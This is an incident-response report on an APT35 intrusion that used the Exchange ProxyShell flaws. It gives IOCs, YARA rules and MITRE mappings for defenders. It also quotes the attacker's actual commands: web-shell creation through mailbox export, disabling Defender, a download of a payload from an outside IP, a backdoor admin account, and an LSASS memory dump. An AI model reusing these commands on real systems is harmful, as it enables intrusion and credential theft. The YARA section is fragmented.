thedfirreport.com /2022/03/21/apt35-automates-initial-access-using-proxyshell/ APT35 Automates Initial Access Using ProxyShell ⋮ 3/21/2022In December 2021, we observed an adversary exploiting the Microsoft Exchange ProxyShell vulnerabilities to gain initial access and execute code via multiple web shells. The overlap of activities and tasks was remarkably similar to that observed in our previous report, “Exchange Exploit Leads to Domain Wide Ransomware“.In this intrusion, we observed the initial exploitation of the ProxyShell vulnerabilities followed by some further post- exploitation activity, which included web shells, credential dumping, and specialized payloads. We assess that this activity was related to APT35 (TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster) due to the TTP’s mirroring previously reported activity that was attributed to the group. Case SummaryThe threat actors activity occurred in two bursts within a 3 day time frame. As with our previous case, they started by uploading their web shell and disabling antivirus services.Soon after, they established two persistence methods. The first was through scheduled tasks, and the second, was via a newly created account. The account was then added to the “remote desktop users” and “local administrators users” groups. Like in the prior case involving ProxyShell, we observed a file masquerading as dllhost.exe that exhibited similarities to a proxy tool call Fast Reverse Proxy (with modifications) downloaded from the same IP as observed in the prior case and connecting to suspect domains.After establishing alternative ways of re-entering the targeted host, they enumerated the environment using Windows native programs such as net and ipconfig. At the end of their first visit, they disabled LSA protection, enabled WDigest for access to plain text credentials later, dumped the LSASS process memory, and downloaded the results via the web shell.All of this activity occurred over a time frame of around 2 minutes, leading us to assess that the entire attack was likely scripted out. The user agent strings of python-requests/2.26.0 and python-urllib3/1.26.7 also point to the use of scripts.Two days later, we saw the threat actors reappear. We expected them to pick up where they left off, however, they repeated all previous actions. Due to the similarity between the commands and the sequential order they ran, this is additional evidence the threat actors employed automated scripts to execute these activities.No further activity was observed as the threat actors were evicted from the network.ServicesWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline1/192/193/19Analysis and reporting completed by @samaritan_o, @kostastsale, @svch0st and @RoxpinTeddy. Initial AccessAs similarly seen in our previous report Exchange Exploit Leads to Domain Wide Ransomware, this threat actor utilized the Microsoft Exchange ProxyShell vulnerabilities; an exploit chain of 3 different CVEs:CVE-2021-34473 CVE-2021-34523 CVE-2021-31207With the appropriate PowerShell logging available we were able to recover the PowerShell commandlets executed on the Exchange server, which resulted in the creation of web shells on the host.Once the threat actor had gained a valid privileged session using CVE-2021-34473 and CVE-2021-34523, they then ensured the default Administrator account had the correct role for mailbox importing and exporting: New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "[email protected] <REDACTED>"The threat actor initiated a mailbox export that matched the search criteria of Subject -eq 'aspx_wkggiyvttmu' to a provided location with the .aspx extension. While the file created is a legitimate .pst file, in it contains plaintext web shell code that is rendered by IIS when requested. New-MailboxExportRequest -Mailbox "[email protected]<REDACTED>" -FilePath "\\localhost\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\auth\aspx_wkggiyvttmu.aspx" -IncludeFolders ("#Drafts#") -ContentFilter "Subject -eq 'aspx_wkggiyvttmu'"In an attempt to hide the actions taken, the actor removes the request just created: Remove-MailboxExportRequest -Confirm "False" -Force "True" -Identity "77a883a7-470c- 471c-a193-f4c54f263fde"This activity then repeated approximately 2 days after the initial exploitation. As the actor had already achieved remote execution by this point, there is a high likelihood the exploitation of Exchange servers is automated. Below is the second web shell created that shares the same naming convention as the first. New-MailboxExportRequest -Mailbox "[email protected]<REDACTED>" -FilePath "\\localhost\c$\inetpub\wwwroot\aspnet_client\system_web\aspx_dyukbdcxjfi.aspx" - IncludeFolders ("#Drafts#") -ContentFilter "Subject -eq 'aspx_dyukbdcxjfi'"4/19Execution Approximately 20 seconds after the web shell aspx_wkggiyvttmu.aspx was created, a flurry of POST requests were sent to the web shell.5/19The web shell followed a similar structure seen in previous cases. At least two parameters are sent in the POST request to the web shell, delimiter which defines what string is used to separate the response, and exec_code which is the command to be ran. The web shell had predefined functions for special actions:get – Get file from location on disk (additional dst POST parameter) put – Upload file to location (additional dst POST parameter) run – Execute a list of commands separated by “;” using PowerShell.If exec_code does not start with one of the above commands, it will simply attempt to run it with PowerShell.The environment for this investigation had SSL inspection and PCAPs available for analysis which allowed us to see the commands being sent to the web shell itself. Below you can see an example of commands that were sent and the outputs they returned in the response.6/19The actor first uploaded a file Wininet.xml, which is later used to create a scheduled task, to C:\windows\temp using the put command of the web shell. This was followed shortly by several commands to impair Windows Defender before downloading and executing a fake dllhost.exe from 148.251.71[.]182.Scheduled Task Commands: schtasks.exe /Create /F /XML C:\windows\temp\Wininet.xml /tn '\Microsoft\Windows\Maintenance\Wininet' schtasks.exe /Run /tn '\Microsoft\Windows\Maintenance\Wininet'Defender Modification Command: try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference - SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {} Start-Process powershell.exe {$file='c:\windows\dllhost.exe'; Invoke-WebRequest -Uri 'hXXp://148.251.71[.]182/update[.]tmp' -OutFile $file}The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell. Wininet.bat simply loops through the execution of the file dllhost.exe.The file dllhost.exe is a golang binary. When executed, the binary was observed resolving the following domains:api.myip[.]com (for discovery) tcp443.msupdate[.]us kcp53.msupdate[.]usThe binary also spawns the following commands when executed:cmd /c wmic computersystem get domain powershell /c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheadersThe binary has a low confidence reference to FRP (FastReverseProxy) as the sample matches the closed source Yara rule – HKTL_PUA_FRP_FastReverseProxy_Oct21_1 (by Florian Roth) however it does not behave in the same way as the open source tool. This file also matches on an additional Yara rule more recently – APT_MAL_Go_FRP_CharmingKitten_Jan22_1 pointing to the file including some code from FRP but otherwise having been modified for use by this threat actor.7/19PersistenceThe threat actor utilized both account creation and scheduled tasks to gain persistence in the environment.New account creationDuring the first activity, we observed the use of user.exe executable that ran the following PowerShell command: powershell.exe /c net user /add DefaultAccount [email protected]; net user DefaultAccount /active:yes; net user DefaultAccount [email protected]; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccountThe first thing they did was make a new user named DefaultAccount with the password [email protected]. They then activated the account and changed the password ([email protected]) for the second time. Finally the commands added the new account to the Administrators group and Remote Desktop Users group.The threat actors ran the same command again two days later: powershell.exe /c net user /add DefaultAccount [email protected]; net user DefaultAccount /active:yes; net user DefaultAccount [email protected]; net localgroup Administrators /add DefaultAccount; net localgroup 'Remote Desktop Users' /add DefaultAccountDue to the close proximity between executed commands, we assess that the threat actors used tools to automate the execution and discovery phases of this attack.Scheduled taskAs previously noted, we discovered the creation of a Scheduled task from a .xml template that was copied to the server via the web shell.8/19Below, we can observe the content of wininet.xml:9/1910/19The following commands where then ran to initiate the task and to achieve persistence: schtasks.exe /Create /F /XML %wintmp%\Wininet.xml /tn '\Microsoft\Windows\Maintenance\Wininet' schtasks.exe /Run /tn '\Microsoft\Windows\Maintenance\Wininet' Privilege EscalationThe scheduled task created by the web shell was set to use the principal SID “S-1-5-18”, or SYSTEM. <UserId>S-1-5-18</UserId> Defense EvasionUsing PowerShell the threat actors issued several commands to impair Windows Defender including:Windows Defender Behavior Monitoring was disabled. The Severe Threat default action was set to ‘Allow’. Realtime Monitoring was disabled. The ‘C:\Windows’ path was excluded from scheduled and real-time scanning.try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference - SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}A rule was added to the Windows Firewall to allow remote RDP traffic. "netsh" advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389Remote Desktop Services was started. "net" start TermServiceThe threat actor enabled WDigest authentication. This enforces the storage of credentials in plaintext on future logins. "reg" add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /fLSA protection was disabled. "reg" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f Credential AccessThe threat actor created a process memory dump from LSASS.exe. In this case they created a “minidump” using the LOLBIN comsvcs.dll. This was dropped to disk as ssasl.pmd (lsass.dmp reversed) and then zipped before exfiltration. "powershell.exe" /c Remove-Item -Path C:\windows\temp\ssasl.pmd -Force -ErrorAction Ignore; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\ssasl.pmd full | out-host; Compress-Archive C:\windows\temp\ssasl.pmd C:\windows\temp\ssasl.zip11/19DiscoveryThe threat actors used native Windows binaries to enumerate the exploited server in an automated fashion. They executed commands such as: net.exe user ipconfig.exe /all powershell.exe (multiple commands) quser.exeThese discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.They used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller. Get-WMIObject Win32_NTDomain | findstr DomainControllerAdditionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command. This was likely done as a test. Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft - hidetableheaders" CollectionWhile having access to the Exchange server, we observed no attempts to export or access user mailboxes. Command and Control As we saw from the execution section,dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.tcp443.msupdate[.]us (107.173.231[.]114) kcp53.msupdate[.]us (107.173.231[.]114)This C2 channel was not used very much as most activity was done through the web shell. Exfiltration12/19The only successful data that was exfiltrated from the environment was the archive containing the LSASS dump.Here you can see the threat actor using the web shell command to extract it:ImpactIn this case, there was no further impact to the environment before the threat actors were evicted. Due to our previous report and OSINT research we believe with medium to high confidence that this intrusion would have ended in ransomware. IndicatorsAll artifacts including web shells, files, IPs, etc. were added to our services in December.Network ipv4:148.251.71[.]182 ipv4:107.173.231[.]114 domain: tcp443.msupdate[.]us domain: kcp53.msupdate[.]us useragent:python-urllib3/1.26.7 useragent:python-requests/2.26.0File ET INFO User-Agent (python-requests) Inbound to Webserver ET INFO Generic HTTP EXE Upload Inbound ET INFO Generic HTTP EXE Upload Outbound GPL ATTACK_RESPONSE command completed ET ATTACK_RESPONSE Net User Command Response ET WEB_SERVER WebShell Generic - netsh firewallSigmaLocal Accounts Discovery – description = "9893_files - file dhvqx.aspx" author = "TheDFIRReport" reference = "url access-using-proxyshell/" date = "2022-03-21" $s1 = "eval(Request['exec_code'],'unsafe');Response.End;" fullword ascii $s2 = "6<script language='JScript' runat='server'>" fullword ascii $s3 = "AEALAAAAAAAAAAA" fullword ascii $s4 = "AFAVAJA" fullword ascii $s5 = "AAAAAAV" fullword ascii $s6 = "LAAAAAAA" fullword ascii $s7 = "ANAZAQA" fullword ascii $s8 = "ALAAAAA" fullword ascii $s9 = "AAAAAEA" ascii $s10 = "ALAHAUA" fullword ascii condition: uint16(0) == 0x4221 and filesize < 800KB and ($s1 and $s2) and 4 of them description = "9893_files - file aspx_dyukbdcxjfi.aspx" author = "TheDFIRReport" reference = "url access-using-proxyshell/" strings: $s1 = "string[] commands = exec_code.Substring(\"run \".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty" ascii $s2 = "string[] commands = exec_code.Substring(\"run \".Length).Split(new[] { ';' }, StringSplitOptions.RemoveEmpty" ascii $s3 = "var dstFile = Path.Combine(dstDir, Path.GetFileName(httpPostedFile.FileName));" fullword ascii $s4 = "info.UseShellExecute = false;" fullword ascii $s5 = "using (StreamReader streamReader = process.StandardError)" fullword ascii $s6 = "return httpPostedFile.FileName + \" Uploaded to: \" + dstFile;" fullword ascii $s7 = "else if (exec_code.StartsWith(\"download \"))" fullword ascii $s8 = "string[] parts = exec_code.Substring(\"download \".Length).Split(' ');" fullword ascii $s9 = "Response.AppendHeader(\"Content-Disposition\", \"attachment; filename=\" + fileName);" fullword ascii $s10 = "result = result + Environment.NewLine + \"ERROR:\" + Environment.NewLine + error;" fullword ascii $s11 = "else if (exec_code == \"get\")" fullword ascii $s12 = "int fileLength = httpPostedFile.ContentLength;" fullword ascii condition: uint16(0) == 0x4221 and filesize < 800KB and 8 of them description = "9893_files - file user.exe" author = "TheDFIRReport" reference = "url access-using-proxyshell/" date = "2022-03-21" $x1 = "PA<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVer" ascii $s2 = "\", or \"requireAdministrator\" --> <v3:requestedExecutionLevel level=\"requireAdministrator\" /> </v3:requestedPrivileges> </v3" ascii $s3 = "-InitOnceExecuteOnce" fullword ascii $s4 = "0\"> <dependency> <dependentAssembly> <assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0." ascii $s5 = "s:v3=\"urn:schemas-microsoft-com:asm.v3\"> <v3:security> <v3:requestedPrivileges> <!-- level can be \"asInvoker\", \"highestAvai" ascii $s6 = "PB_GadgetStack_%I64i" fullword ascii $s7 = "PB_DropAccept" fullword ascii $s8 = "rocessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /> </dependentAssembly> </dependency> <v3:trustInf" ascii $s9 = "PB_PostEventMessage" fullword ascii $s10 = "PB_WindowID" fullword ascii $s11 = "?GetLongPathNameA" fullword ascii $s12 = "Memory page error" fullword ascii $s13 = "PPPPPPH" fullword ascii $s14 = "YZAXAYH" fullword ascii $s15 = "%d:%I64d:%I64d:%I64d" fullword ascii $s17 = "PYZAXAYH" fullword ascii $s18 = "PB_MDI_Gadget" fullword ascii $s19 = "PA<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVer" ascii $s20 = " 46B722FD25E69870FA7711924BC5304D 787242D55F2C49A23F5D97710D972108 A2DB26CE3BBE7B2CB12F9BEFB37891A3" fullword wide condition: uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*) and 4 of them16/19}rule task_update { meta: description = "9893_files - file task_update.exe" author = "TheDFIRReport" reference = "url access-using-proxyshell/" date = "2022-03-21" $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii $s2 = " or \"requireAdministrator\" --> <v3:requestedExecutionLevel level=\"requireAdministrator\" /> </v3:requestedPrivileges> </v3:se" ascii $s3 = "-InitOnceExecuteOnce" fullword ascii $s4 = "> <dependency> <dependentAssembly> <assemblyIdentity type=\"win32\" $s5 = "v3=\"urn:schemas-microsoft-com:asm.v3\"> <v3:security> <v3:requestedPrivileges> <!-- level can be \"asInvoker\", \"highestAvaila" ascii $s6 = "PB_GadgetStack_%I64i" fullword ascii $s7 = "PB_DropAccept" fullword ascii $s8 = "PB_PostEventMessage" fullword ascii $s9 = "PB_WindowID" fullword ascii $s10 = "?GetLongPathNameA" fullword ascii $s11 = "cessorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /> </dependentAssembly> </dependency> <v3:trustInfo " ascii $s12 = "Memory page error" fullword ascii $s13 = "PPPPPPH" fullword ascii $s14 = "YZAXAYH" fullword ascii $s15 = "%d:%I64d:%I64d:%I64d" fullword ascii $s16 = "PYZAXAYH" fullword ascii $s17 = "PB_MDI_Gadget" fullword ascii $s18 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersi" ascii $s19 = " 11FCC18FB2B55FC3C988F6A76FCF8A2D 56D49E57AD1A051BF62C458CD6F3DEA9 6104990DFEA3DFAB044FAF960458DB09" fullword wide $s20 = "PostEventClass" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 300KB and 1 of ($x*) and 4 of them description = "9893_files - file App_Web_vjloy3pa.dll" author = "TheDFIRReport" reference = "url access-using-proxyshell/" date = "2022-03-21" PublicKeyToken=31bf3856ad364e35" fullword ascii PublicKeyToken=b77a5c561934e089" fullword ascii PublicKeyToken=b77a5c561934e089" fullword ascii PublicKeyToken=31bf3856ad364e35" fullword ascii PublicKeyToken=31bf3856ad364e35" fullword ascii PublicKeyToken=31bf3856ad364e35" fullword ascii PublicKeyToken=b03f5f7f11d50a3a" fullword ascii PublicKeyToken=b03f5f7f11d50a3a" fullword ascii PublicKeyToken=b77a5c561934e089" fullword ascii PublicKeyToken=b77a5c561934e089" fullword ascii PublicKeyToken=31bf3856ad364e35" fullword ascii PublicKeyToken=b77a5c561934e089" fullword ascii PublicKeyToken=31bf3856ad364e35" fullword ascii wide /* base64 encoded string '' */ $s17 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" wide /* base64 encoded string '' */ PublicKeyToken=31bf3856ad364e35" fullword ascii PublicKeyToken=b03f5f7f11d50a3a" fullword ascii PublicKeyToken=b03f5f7f11d50a3a" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 2000KB and 1 of ($x*) and 4 of them description = "9893_files - from files user.exe, task_update.exe" author = "TheDFIRReport" reference = "url access-using-proxyshell/" date = "2022-03-21" $s1 = "-InitOnceExecuteOnce" fullword ascii $s2 = "PB_GadgetStack_%I64i" fullword ascii $s3 = "PB_DropAccept" fullword ascii $s4 = "PB_PostEventMessage" fullword ascii $s5 = "PB_WindowID" fullword ascii $s6 = "?GetLongPathNameA" fullword ascii $s7 = "Memory page error" fullword ascii $s8 = "PPPPPPH" fullword ascii $s9 = "YZAXAYH" fullword ascii $s10 = "%d:%I64d:%I64d:%I64d" fullword ascii $s11 = "PYZAXAYH" fullword ascii $s12 = "PB_MDI_Gadget" fullword ascii $s13 = "PostEventClass" fullword ascii $s14 = "t$hYZAXAYH" fullword ascii $s15 = "$YZAXAYH" fullword ascii $s16 = "Floating-point underflow (exponent too small)" fullword ascii $s17 = "Inexact floating-point result" fullword ascii $s18 = "Single step trap" fullword ascii $s19 = "Division by zero (floating-point)" fullword ascii $s20 = "tmHcI(H" fullword ascii condition: ( uint16(0) == 0x5a4d and filesize < 300KB and ( 8 of them ) ) or ( all of them ) }MITREExploit Public-Facing Application – T119018/19OS Credential Dumping – T1003 Account Manipulation – T1098 Valid Accounts – T1078 Ingress Tool Transfer – T1105 Match Legitimate Name or Location – T1036.005 Windows Service – T1543.003 Web Shell – T1505.003 System Information Discovery – T1082 System Network Configuration Discovery – T1016 System Owner/User Discovery – T1033 Windows Command Shell – T1059.003Internal case #989319/19 